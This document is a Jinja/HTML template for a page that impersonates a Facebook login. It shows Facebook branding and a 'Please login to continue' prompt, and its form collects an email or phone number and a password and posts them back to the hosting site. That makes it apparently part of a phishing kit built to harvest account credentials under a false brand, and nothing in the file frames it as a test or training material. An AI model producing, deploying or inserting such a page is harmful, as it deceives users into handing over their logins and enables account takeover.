{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto">
  <div class="platform-header">
    <div class="icon-circle bg-facebook"><i class="fa-brands fa-facebook icon-lg"></i></div>
    <div>
      <h2 class="notranslate" style="margin:0">Facebook</h2>
      <div style="color:#64748b;font-size:13px">Please login to continue</div>
    </div>
  </div>

  <form method="post" style="display:flex;flex-direction:column;gap:12px;">
    <input 
      class="input" 
      name="address" 
      placeholder="Mobile number or email address" 
      required
      style="padding:14px 16px;border-radius:12px;border:1px solid #e6eef8;font-size:15px;box-shadow:0 4px 10px rgba(15,23,42,0.03);transition:all .2s ease;"
    >
    <input 
      class="input" 
      name="password" 
      type="password" 
      placeholder="Password" 
      required
      style="padding:14px 16px;border-radius:12px;border:1px solid #e6eef8;font-size:15px;box-shadow:0 4px 10px rgba(15,23,42,0.03);transition:all .2s ease;"
    >
    <div class="center">
      <button 
        class="btn btn-blue" 
        type="submit"
        style="width:100%;max-width:360px;padding:12px 18px;border-radius:12px;font-size:16px;font-weight:600;box-shadow:0 6px 16px rgba(24,119,242,0.2);transition:all .2s ease;"
      >
        Log in
      </button>
    </div>
  </form>
</div>
{% endblock %}
